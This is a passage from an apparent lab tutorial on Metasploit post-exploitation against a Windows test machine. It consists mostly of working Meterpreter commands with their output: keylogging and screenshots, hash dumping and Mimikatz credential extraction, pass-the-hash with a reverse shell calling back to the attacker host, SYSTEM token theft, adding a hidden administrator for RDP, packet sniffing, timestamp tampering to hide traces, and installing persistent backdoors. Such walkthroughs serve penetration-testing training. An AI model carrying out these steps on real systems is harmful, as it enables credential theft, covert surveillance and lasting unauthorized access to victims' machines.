</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; keyscan_dump
</span><span class='line'>Dumping captured keystrokes...
</span><span class='line'>much $ such security wow
</span><span class='line'>meterpreter &gt; keyscan_stop
</span><span class='line'>Stopping the keystroke sniffer...</span></code></pre></td></tr></table></div></figure>


<p>Now I want to see what the user sees. So let&rsquo;s take a screenshot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; screenshot
</span><span class='line'>Screenshot saved to: /root/ahhOgnkh.jpeg</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/tools/metasploit/ss.jpeg" title="screenshot" alt="screenshot of target desktop"></p>

<p>In case you want to annoy the user, you can mess with some of the user interface:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; uictl -h
</span><span class='line'>Usage: uictl [enable/disable] [keyboard/mouse/all]</span></code></pre></td></tr></table></div></figure>


<p>I can&rsquo;t demo the webcam and mic commands now so I won&rsquo;t go into those, but you have them at your disposal if the target has a webcam or microphone</p>

<h2>Post exploitation</h2>

<p>Once you have a foothold on the system, there are more things that you can do to assist you in squeezing more juice out of the hacked machine</p>

<h3>Dumping hashes</h3>

<p>You can use <em>hashdump</em> to dump the local hashes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; hashdump
</span><span class='line'>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class='line'>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class='line'>wingoat:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code></pre></td></tr></table></div></figure>


<p>It is possible to also get the hashes and credentials straight from memory by using Mimikatz:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; load mimikatz
</span><span class='line'>Loading extension mimikatz...success.
</span><span class='line'>meterpreter &gt; help mimikatz
</span><span class='line'>
</span><span class='line'>Mimikatz Commands
</span><span class='line'>=================
</span><span class='line'>
</span><span class='line'>    Command           Description
</span><span class='line'>    -------           -----------
</span><span class='line'>    kerberos          Attempt to retrieve kerberos creds
</span><span class='line'>    livessp           Attempt to retrieve livessp creds
</span><span class='line'>    mimikatz_command  Run a custom command
</span><span class='line'>    msv               Attempt to retrieve msv creds (hashes)
</span><span class='line'>    ssp               Attempt to retrieve ssp creds
</span><span class='line'>    tspkg             Attempt to retrieve tspkg creds
</span><span class='line'>    wdigest           Attempt to retrieve wdigest creds
</span><span class='line'>meterpreter &gt; msv
</span><span class='line'>[+] Running as SYSTEM
</span><span class='line'>[*] Retrieving msv credentials
</span><span class='line'>msv credentials
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>AuthID   Package    Domain           User              Password
</span><span class='line'>------   -------    ------           ----              --------
</span><span class='line'>0;98494  NTLM       WIN-D7GA2J1M0TU  wingoat           lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
</span><span class='line'>0;996    Negotiate  WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)
</span><span class='line'>0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
</span><span class='line'>0;49813  NTLM                                          n.s. (Credentials KO)
</span><span class='line'>0;999    NTLM       WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)</span></code></pre></td></tr></table></div></figure>


<h3>Pass the hash</h3>

<p>We can now use the <a href="https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified">psexec</a> module to pass the hash and get access on the box, without any cracking. Note that on my Windows lab machine, I had to go to Local Security Policy &ndash;> Local Policies &ndash;> Security Options &ndash;> Accounts: Limit local account use of blank passwords to console logon only and set it to disabled.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(psexec) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/windows/smb/psexec):
</span><span class='line'>
</span><span class='line'>   Name                  Current Setting                                                    Required  Description
</span><span class='line'>   ----                  ---------------                                                    --------  -----------
</span><span class='line'>   RHOST                 192.168.80.128                                                     yes       The target address
</span><span class='line'>   RPORT                 445                                                                yes       Set the SMB service port
</span><span class='line'>   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
</span><span class='line'>   SERVICE_DISPLAY_NAME                                                                     no        The service display name
</span><span class='line'>   SERVICE_NAME                                                                             no        The service name
</span><span class='line'>   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
</span><span class='line'>   SMBDomain             .                                                                  no        The Windows domain to use for authentication
</span><span class='line'>   SMBPass               aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  no        The password for the specified username
</span><span class='line'>   SMBUser               wingoat                                                            no        The username to authenticate as
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/x64/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     5555             yes       The listen port
</span><span class='line'>...
</span><span class='line'>msf exploit(psexec) &gt; run
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:5555 
</span><span class='line'>[*] Connecting to the server...
</span><span class='line'>[*] Authenticating to 192.168.80.128:445 as user 'wingoat'...
</span><span class='line'>[*] Selecting PowerShell target
</span><span class='line'>[*] 192.168.80.128:445 - Executing the payload...
</span><span class='line'>[+] 192.168.80.128:445 - Service start timed out, OK if running a command or non-service executable...
</span><span class='line'>[*] Sending stage (1188911 bytes) to 192.168.80.128
</span><span class='line'>[*] Meterpreter session 4 opened (192.168.80.155:5555 -&gt; 192.168.80.128:49177) at 2016-06-09 11:37:22 -0400</span></code></pre></td></tr></table></div></figure>


<h3>Token impersonation</h3>

<p>We owned an administrator account. But we want even more privileges. We can use the <em>incognito</em> module to steal the SYSTEM token for ourselves:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; use incognito
</span><span class='line'>Loading extension incognito...success.
</span><span class='line'>meterpreter &gt; help
</span><span class='line'>...
</span><span class='line'>Incognito Commands
</span><span class='line'>==================
</span><span class='line'>
</span><span class='line'>    Command              Description
</span><span class='line'>    -------              -----------
</span><span class='line'>    add_group_user       Attempt to add a user to a global group with all tokens
</span><span class='line'>    add_localgroup_user  Attempt to add a user to a local group with all tokens
</span><span class='line'>    add_user             Attempt to add a user with all tokens
</span><span class='line'>    impersonate_token    Impersonate specified token
</span><span class='line'>    list_tokens          List tokens available under current user context
</span><span class='line'>    snarf_hashes         Snarf challenge/response hashes for every token</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what tokens are available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; list_tokens
</span><span class='line'>Usage: list_tokens &lt;list_order_option&gt;
</span><span class='line'>
</span><span class='line'>Lists all accessible tokens and their privilege level
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -g        List tokens by unique groupname
</span><span class='line'>    -u        List tokens by unique username
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>meterpreter &gt; list_tokens -u
</span><span class='line'>[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</span><span class='line'>             Call rev2self if primary process token is SYSTEM
</span><span class='line'>
</span><span class='line'>Delegation Tokens Available
</span><span class='line'>========================================
</span><span class='line'>NT AUTHORITY\LOCAL SERVICE
</span><span class='line'>NT AUTHORITY\NETWORK SERVICE
</span><span class='line'>NT AUTHORITY\SYSTEM
</span><span class='line'>WIN-D7GA2J1M0TU\wingoat
</span><span class='line'>
</span><span class='line'>Impersonation Tokens Available
</span><span class='line'>========================================
</span><span class='line'>NT AUTHORITY\ANONYMOUS LOGON</span></code></pre></td></tr></table></div></figure>


<p>We are interested in the delegation tokens that are created by interactive logins. And among them..the SYSTEM token that we want!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; impersonate_token 
</span><span class='line'>Usage: impersonate_token &lt;token&gt;
</span><span class='line'>
</span><span class='line'>Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.
</span><span class='line'>
</span><span class='line'>Hint: Double backslash DOMAIN\\name (meterpreter quirk)
</span><span class='line'>Hint: Enclose with quotation marks if name contains a space
</span><span class='line'>
</span><span class='line'>meterpreter &gt; impersonate_token 'NT AUTHORITY\SYSTEM'
</span><span class='line'>[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</span><span class='line'>             Call rev2self if primary process token is SYSTEM
</span><span class='line'>[+] Delegation token available
</span><span class='line'>[+] Successfully impersonated user NT AUTHORITY\SYSTEM
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: NT AUTHORITY\SYSTEM</span></code></pre></td></tr></table></div></figure>


<h3>Remote Desktop</h3>

<p>Another way we can get access to the system is via Remote Desktop:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run getgui
</span><span class='line'>Windows Remote Desktop Enabler Meterpreter Script
</span><span class='line'>Usage: getgui -u &lt;username&gt; -p &lt;password&gt;
</span><span class='line'>Or:    getgui -e
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -e        Enable RDP only.
</span><span class='line'>    -f &lt;opt&gt;  Forward RDP Connection.
</span><span class='line'>    -h        Help menu.
</span><span class='line'>    -p &lt;opt&gt;  The Password of the user to add.
</span><span class='line'>    -u &lt;opt&gt;  The Username of the user to add.</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s use it to enable Remote Desktop on the target and add our own user:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run getgui -e
</span><span class='line'>[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
</span><span class='line'>[*] Carlos Perez carlos_perez@darkoperator.com
</span><span class='line'>[*] Enabling Remote Desktop
</span><span class='line'>[*]   RDP is disabled; enabling it ...
</span><span class='line'>[*] Setting Terminal Services service startup mode
</span><span class='line'>[*]   The Terminal Services service is not set to auto, changing it to auto ...
</span><span class='line'>[*]   Opening port in local firewall if necessary
</span><span class='line'>[*] The following Error was encountered: Rex::TimeoutError Operation timed out.
</span><span class='line'>[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2112.rc
</span><span class='line'>meterpreter &gt; run getgui -u master -p pwned
</span><span class='line'>[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
</span><span class='line'>[*] Carlos Perez carlos_perez@darkoperator.com
</span><span class='line'>[*] Setting user account for logon
</span><span class='line'>[*]   Adding User: master with Password: pwned
</span><span class='line'>[*]   Hiding user from Windows Login screen
</span><span class='line'>[*]   Adding User: master to local group 'Remote Desktop Users'
</span><span class='line'>[*]   Adding User: master to local group 'Administrators'
</span><span class='line'>[*] You can now login with the created user
</span><span class='line'>[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc</span></code></pre></td></tr></table></div></figure>


<p>And to check if it worked, we can use the <em>rdesktop</em> client like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#rdesktop -u master -p pwned 192.168.80.128</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/tools/metasploit/rd.png" title="remote desktop" alt="remote desktop session on hacked machine"></p>

<p>However, this is not very stealthy, because if another user is logged in, they will be disconnected. Anyway, better clean up after ourselves when we&rsquo;re done:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc
</span><span class='line'>[*] Running Command List ...
</span><span class='line'>[*]   Running command execute -H -f cmd.exe -a "/c net user master /delete"
</span><span class='line'>Process 832 created.
</span><span class='line'>[*]   Running command reg deleteval -k HKLM\\SOFTWARE\\Microsoft\\Windows\ NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -v master
</span><span class='line'>[-] stdapi_registry_open_key: Operation failed: The system cannot find the file specified.</span></code></pre></td></tr></table></div></figure>


<p>Despite the error above, the user was removed from the logon session. However, some files of that user remained behind and I had to manually delete them</p>

<h3>Packet sniffing</h3>

<p>Further on, we can enable a packet sniffer on the target to gather more sensitive information:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; use sniffer
</span><span class='line'>Loading extension sniffer...success.
</span><span class='line'>meterpreter &gt; help
</span><span class='line'>...
</span><span class='line'>Sniffer Commands
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>    Command             Description
</span><span class='line'>    -------             -----------
</span><span class='line'>    sniffer_dump        Retrieve captured packet data to PCAP file
</span><span class='line'>    sniffer_interfaces  Enumerate all sniffable network interfaces
</span><span class='line'>    sniffer_release     Free captured packets on a specific interface instead of downloading them
</span><span class='line'>    sniffer_start       Start packet capture on a specific interface
</span><span class='line'>    sniffer_stats       View statistics of an active capture
</span><span class='line'>    sniffer_stop        Stop packet capture on a specific interface</span></code></pre></td></tr></table></div></figure>


<p>First, we must learn what network interfaces are available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sniffer_interfaces
</span><span class='line'>
</span><span class='line'>1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
</span><span class='line'>2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span></code></pre></td></tr></table></div></figure>


<p>Now we can start sniffing:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sniffer_start 2
</span><span class='line'>[*] Capture started on interface 2 (50000 packet buffer)</span></code></pre></td></tr></table></div></figure>


<p>We can then dump the packets to a file and see if we&rsquo;ve got anything interesting:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sniffer_dump 2 /root/capture.pcap
</span><span class='line'>[*] Flushing packet capture buffer for interface 2...
</span><span class='line'>[*] Flushed 873 packets (756096 bytes)
</span><span class='line'>[*] Downloaded 069% (524288/756096)...
</span><span class='line'>[*] Downloaded 100% (756096/756096)...
</span><span class='line'>[*] Download completed, converting to PCAP...
</span><span class='line'>[*] PCAP file written to /root/capture.pcap</span></code></pre></td></tr></table></div></figure>


<h3>Modifying file attributes</h3>

<p>If you left traces on the filesystem, you can modify or erase file attributes to conceal your footprints:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; timestomp -h
</span><span class='line'>
</span><span class='line'>Usage: timestomp OPTIONS file_path
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -a &lt;opt&gt;  Set the "last accessed" time of the file
</span><span class='line'>    -b        Set the MACE timestamps so that EnCase shows blanks
</span><span class='line'>    -c &lt;opt&gt;  Set the "creation" time of the file
</span><span class='line'>    -e &lt;opt&gt;  Set the "mft entry modified" time of the file
</span><span class='line'>    -f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -m &lt;opt&gt;  Set the "last written" time of the file
</span><span class='line'>    -r        Set the MACE timestamps recursively on a directory
</span><span class='line'>    -v        Display the UTC MACE values of the file
</span><span class='line'>    -z &lt;opt&gt;  Set all four attributes (MACE) of the file</span></code></pre></td></tr></table></div></figure>


<h3>Backdooring the system</h3>

<p>If you want to maintain your presence on the target system, Metasploit has two types of backdoors that can be installed as a service on the target. However, keep in mind that they don&rsquo;t have any authentication, so best not leave them around on computers outside a lab environment &ndash; you don&rsquo;t want to open the door for everyone else in the world.</p>

<h4>Metsvc</h4>

<p>This is how Metsvc looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run metsvc -h
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -A        Automatically start a matching exploit/multi/handler to connect to the service
</span><span class='line'>    -h        This help menu
</span><span class='line'>    -r        Uninstall an existing Meterpreter service (files must be deleted manually)
</span><span class='line'>
</span><span class='line'>meterpreter &gt; run metsvc
</span><span class='line'>[*] Creating a meterpreter service on port 31337
</span><span class='line'>[*] Creating a temporary installation directory C:\Users\wingoat\AppData\Local\Temp\zMWkKgMkxJRdgpp...
</span><span class='line'>[*]  &gt;&gt; Uploading metsrv.x86.dll...
</span><span class='line'>[*]  &gt;&gt; Uploading metsvc-server.exe...
</span><span class='line'>[*]  &gt;&gt; Uploading metsvc.exe...
</span><span class='line'>[*] Starting the service...
</span><span class='line'>   * Installing service metsvc
</span><span class='line'> * Starting service
</span><span class='line'>Service metsvc successfully installed.</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, I couldn&rsquo;t connect to it because I got a bunch of SSL errors and I couldn&rsquo;t find any workaround.</p>

<h4>Persistence</h4>

<p>The Persistence script has more options:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run persistence -h
</span><span class='line'>Meterpreter Script for creating a persistent backdoor on a target host.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -A        Automatically start a matching exploit/multi/handler to connect to the agent
</span><span class='line'>    -L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.
</span><span class='line'>    -P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.
</span><span class='line'>    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
</span><span class='line'>    -T &lt;opt&gt;  Alternate executable template to use
</span><span class='line'>    -U        Automatically start the agent when the User logs on
</span><span class='line'>    -X        Automatically start the agent when the system boots
</span><span class='line'>    -h        This help menu
</span><span class='line'>    -i &lt;opt&gt;  The interval in seconds between each connection attempt
</span><span class='line'>    -p &lt;opt&gt;  The port on which the system running Metasploit is listening
</span><span class='line'>    -r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back</span></code></pre></td></tr></table></div></figure>


<p>First, we set our listener:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</span><span class='line'>PAYLOAD =&gt; windows/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(handler) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/handler):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     5555             yes       The listen port
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Then on the target machine we install the backdoor and it connects back to us!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run persistence -U -i 5 -p 5555 -r 192.168.80.155
</span><span class='line'>[*] Running Persistance Script
</span><span class='line'>[*] Resource file for cleanup created at /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.5432/WIN-D7GA2J1M0TU_20160610.5432.rc
</span><span class='line'>[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.80.155 LPORT=5555
</span><span class='line'>[*] Persistent agent script is 148445 bytes long
</span><span class='line'>[+] Persistent Script written to C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
